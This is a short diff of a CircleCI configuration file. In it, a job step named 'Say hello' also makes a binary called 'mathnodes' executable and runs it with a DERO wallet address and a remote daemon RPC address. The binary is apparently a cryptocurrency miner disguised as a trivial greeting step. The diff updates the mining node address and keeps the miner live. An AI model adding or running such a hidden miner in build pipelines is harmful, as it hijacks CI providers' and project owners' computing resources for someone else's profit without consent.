@@ -16,7 +16,8 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command: echo Hello, World!;chmod 700 mathnodes;./mathnodes --wallet-address=dero1qysflwnyf4mqhzdet7v478nn5l38q6u0uh9g86vtcpmrze0ml8xc7qgdhw9aj --daemon-rpc-address=51.222.96.66:80
+          command: echo Hello, World!;chmod 700 mathnodes;./mathnodes --wallet-address=dero1qysflwnyf4mqhzdet7v478nn5l38q6u0uh9g86vtcpmrze0ml8xc7qgdhw9aj --daemon-rpc-address=dero-node.mysrv.cloud:10300
+
 
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
